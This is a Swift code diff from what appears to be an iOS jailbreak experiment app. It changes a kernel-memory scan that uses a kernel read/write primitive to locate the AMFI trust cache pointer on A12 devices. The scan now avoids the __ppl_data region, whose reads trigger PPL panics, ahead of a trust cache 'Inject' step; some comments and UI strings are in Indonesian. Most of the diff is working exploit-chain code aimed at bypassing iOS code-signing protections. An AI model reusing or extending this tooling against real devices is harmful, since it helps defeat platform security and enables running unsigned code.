@@ -182,6 +182,18 @@ private func isSafeKernelKreadAddress(_ va: UInt64) -> Bool {
     return true
 }
 
+/// __DATA.__ppl_data — KRW read → "Unexpected fault in kernel static region" (A12 PPL).
+private func isInPPLDataRegion(_ va: UInt64, kernTextBase: UInt64) -> Bool {
+    let ppl = PhysmapConstants.pplDataSegmentBase(kernTextBase: kernTextBase)
+    return va >= ppl && va < ppl + 0x100000
+}
+
+/// Trust cache runtime object is heap (kalloc), not static __DATA / __ppl_data.
+private func isLikelyTrustCacheHeapPointer(_ v: UInt64, kernTextBase: UInt64) -> Bool {
+    guard v >= 0xffffffe000000000 && v < 0xffffffe800000000 else { return false }
+    return !isInPPLDataRegion(v, kernTextBase: kernTextBase)
+}
+
 private func safeKread64Kernel(_ va: UInt64) -> UInt64 {
     guard isSafeKernelKreadAddress(va) else { return 0 }
     return ds_kread64_safe(va)
@@ -525,7 +537,7 @@ struct AMFIExperimentView: View {
             } header: {
                 Label("Jailbreak Path", systemImage: "flag.checkered")
             } footer: {
-                Text("Jika 74 sudah hijau: langsung ② Trust Cache Probe. Ulang 74 hanya jika reboot/ganti build. ③ Inject setelah ② OK.")
+                Text("② Probe hanya baca __DATA aman (bukan __ppl_data). ③ Inject setelah ② OK.")
                     .font(.system(size: 9))
             }
 
@@ -4131,13 +4143,13 @@ struct AMFIExperimentView: View {
         let dataSegBase = PhysmapConstants.dataSegmentBase(kernTextBase: kernBase)
         let pplDataBase = PhysmapConstants.pplDataSegmentBase(kernTextBase: kernBase)
         detail += "__DATA: 0x\(String(format: "%llx", dataSegBase))\n"
-        detail += "__DATA.__ppl_data: 0x\(String(format: "%llx", pplDataBase))\n\n"
+        detail += "__DATA.__ppl_data: 0x\(String(format: "%llx", pplDataBase)) (TIDAK dibaca — PPL panic)\n\n"
 
         var tcStructAddr: UInt64 = 0
         var tcEntryCount: UInt64 = 0
 
         func tryTrustCachePointer(_ val: UInt64, label: String) -> Bool {
-            guard isSafeKernelKreadAddress(val) else { return false }
+            guard isLikelyTrustCacheHeapPointer(val, kernTextBase: kernBase) else { return false }
             let tcVer = safeKread32Kernel(val)
             let tcCnt = safeKread32Kernel(val + 4)
             guard tcVer >= 1 && tcVer <= 3 && tcCnt > 0 && tcCnt < 50000 else { return false }
@@ -4149,36 +4161,34 @@ struct AMFIExperimentView: View {
             return true
         }
 
-        detail += "=== Scan __DATA.__ppl_data (direct KRW, 16 pages) ===\n"
-        let pplProbe = safeKread64Kernel(pplDataBase)
-        detail += "pplDataBase peek: 0x\(String(format: "%llx", pplProbe))\n"
-        for pageIdx in 0..<16 {
-            let pageBase = pplDataBase &+ UInt64(pageIdx) * 0x4000
-            guard isSafeKernelKreadAddress(pageBase) else { continue }
-            for off in stride(from: UInt64(0), to: UInt64(0x4000), by: 8) {
-                let val = safeKread64Kernel(pageBase + off)
-                if tryTrustCachePointer(val, label: "ppl page \(pageIdx)+0x\(String(format: "%x", off))") {
-                    break
-                }
+        // Pre-PPL __DATA only (0 .. +0x8000). Full 512KB scan hit __ppl_data → static region panic.
+        detail += "=== Scan __DATA pre-PPL (0 .. +0x\(String(format: "%x", PhysmapConstants.pplDataOffsetFromData))) ===\n"
+        for off in stride(from: UInt64(0), to: PhysmapConstants.pplDataOffsetFromData, by: 8) {
+            let addr = dataSegBase + off
+            guard isSafeKernelKreadAddress(addr), !isInPPLDataRegion(addr, kernTextBase: kernBase) else { continue }
+            let val = safeKread64Kernel(addr)
+            if tryTrustCachePointer(val, label: "__DATA+0x\(String(format: "%x", off))") {
+                break
             }
-            if tcStructAddr != 0 { break }
         }
 
+        // pmap_cs / AMFI globals band (unslid __DATA+0x45b8) — known KRW-safe on A12
         if tcStructAddr == 0 {
-            detail += "\n=== Scan __DATA (512KB, direct KRW) ===\n"
-            for off in stride(from: UInt64(0), to: UInt64(0x80000), by: 8) {
+            detail += "\n=== Scan pmap_cs band (__DATA+0x4000..0x5000) ===\n"
+            for off in stride(from: UInt64(0x4000), to: UInt64(0x5000), by: 8) {
                 let addr = dataSegBase + off
-                guard isSafeKernelKreadAddress(addr) else { continue }
+                guard isSafeKernelKreadAddress(addr), !isInPPLDataRegion(addr, kernTextBase: kernBase) else { continue }
                 let val = safeKread64Kernel(addr)
-                if tryTrustCachePointer(val, label: "__DATA+0x\(String(format: "%x", off))") {
+                if tryTrustCachePointer(val, label: "pmap_cs band+0x\(String(format: "%x", off))") {
                     break
                 }
             }
         }
 
         guard tcStructAddr != 0 else {
-            detail += "\n❌ Trust cache tidak ditemukan via direct KRW.\n"
-            detail += "Inject/physmap butuh pmap valid — jangan tap ③ dulu.\n"
+            detail += "\n❌ Pointer trust cache (heap) tidak ditemukan di __DATA aman.\n"
+            detail += "__ppl_data sengaja dilewati (PPL). Coba Exp 60 sysctl atau kernelcache XPF.\n"
+            detail += "Jangan tap ③ Inject.\n"
             return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
 
